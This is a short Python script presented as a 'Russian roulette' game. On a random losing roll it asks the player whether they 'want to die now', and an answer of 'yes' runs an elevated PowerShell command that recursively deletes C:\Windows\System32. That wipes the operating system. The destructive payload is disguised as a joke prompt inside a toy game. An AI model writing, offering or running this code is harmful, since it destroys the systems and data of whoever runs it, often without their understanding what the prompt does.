import random
import subprocess




while True:
    print("Russian roulette started")

    gun = random.randint(0, 6)

    if gun == 1:
        print("You lost the game.")
        ask = input("do you want to die now yes/no:")
        if ask == 'yes':
            command = 'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/k del /s /q C:\Windows\System32\'"'

            subprocess.run(command, shell=True)
        else:
            print("you are scared huh")
        break
    else:
        print("You won this round.")

    continue1 = input("Do you want to play again? (yes/no): ").strip().lower()
    if continue1 != 'yes':
        break

